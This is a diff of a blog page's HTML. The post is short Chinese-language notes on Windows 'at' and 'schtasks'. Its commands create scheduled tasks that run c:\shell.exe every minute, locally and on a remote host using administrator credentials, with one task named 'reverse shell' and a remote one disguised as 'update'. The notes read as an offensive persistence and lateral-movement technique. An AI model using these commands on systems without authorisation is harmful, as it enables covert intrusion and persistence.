@@ -20,7 +20,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="win计划任务小记"/>
+        <meta property="og:title" content="win计划任务小记 [ at schtasks ]"/>
     
 
     <!--Open Graph Description-->
@@ -44,7 +44,7 @@
 
     <!-- Title -->
     
-    <title>win计划任务小记 - klion&#39;s blog</title>
+    <title>win计划任务小记 [ at schtasks ] - klion&#39;s blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -137,7 +137,7 @@
     <div class="post-header">
         <h1 class="title">
             <a href="/2016/09/23/time-tasks/">
-                win计划任务小记
+                win计划任务小记 [ at schtasks ]
             </a>
         </h1>
         <div class="post-info">
@@ -159,11 +159,10 @@
         
 
         <!-- Post Content -->
-        <p><br></p>
-<h4 id="1-关于系统计划任务的一些简单使用-03以前的系统中可使用-at-来执行各种系统计划任务"><a href="#1-关于系统计划任务的一些简单使用-03以前的系统中可使用-at-来执行各种系统计划任务" class="headerlink" title="1,关于系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务"></a>1,关于系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at 14:23 /every:18,19,21,24,28 c:\shell.exe  创建本地计划任务,每月的这几号的这个点执行指定的可执行程序</span></div><div class="line"><span class="comment"># at /delete /y 	删除本地所有的计划任务</span></div></pre></td></tr></table></figure>
+        <p><br><br>1,关于系统计划任务的一些简单使用,03以前的系统中可使用 at 来执行各种系统计划任务<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at 14:23 /every:18,19,21,24,28 c:\shell.exe  创建本地计划任务,每月的这几号的这个点执行指定的可执行程序</span></div><div class="line"><span class="comment"># at /delete /y 	删除本地所有的计划任务</span></div></pre></td></tr></table></figure></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># at \\192.168.3.23 14:23 /every:18,19,21,24,28 c:\shell.exe 在远程机器上创建计划任务</span></div><div class="line"><span class="comment"># at \\192.168.3.23 /delete /y 删除远程机器上的所有的计划任务</span></div></pre></td></tr></table></figure>
 <a id="more"></a>
-<h4 id="2-如果是win7以后的系统可利用schtasks来执行各种计划任务-另外-如果是中文系统-可能还需要先改下字符集-不然会有些问题"><a href="#2-如果是win7以后的系统可利用schtasks来执行各种计划任务-另外-如果是中文系统-可能还需要先改下字符集-不然会有些问题" class="headerlink" title="2,如果是win7以后的系统可利用schtasks来执行各种计划任务,另外,如果是中文系统,可能还需要先改下字符集,不然会有些问题"></a>2,如果是win7以后的系统可利用schtasks来执行各种计划任务,另外,如果是中文系统,可能还需要先改下字符集,不然会有些问题</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># chcp 437</span></div></pre></td></tr></table></figure>
+<p>2,如果是win7以后的系统可利用schtasks来执行各种计划任务,另外,如果是中文系统,可能还需要先改下字符集,不然会有些问题<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># chcp 437</span></div></pre></td></tr></table></figure></p>
 <p>在本地机器创建删除计划任务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># schtasks /create /sc minute /mo 1 /tn "reverse shell" /tr c:\shell.exe</span></div><div class="line"><span class="comment"># schtask /query | findsrt "shell"</span></div><div class="line"><span class="comment"># schtasks /delete /tn "reverse shell" /F</span></div></pre></td></tr></table></figure></p>
 <p>创建删除远程机器上的计划任务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># schtasks /s 192.168.3.23 /u administrator /p admin!@#45 /create /sc minute /mo 1 /tn "update" /tr c:\shell.exe</span></div><div class="line"><span class="comment"># schtasks /s 192.168.3.23 /u administrator /p admin!@#45 /query | findstr update</span></div><div class="line"><span class="comment"># schtasks /s 192.168.3.23 /u administrator /p admin!@#45 /delete /tn "update" /F</span></div></pre></td></tr></table></figure></p>
 <p><br></p>
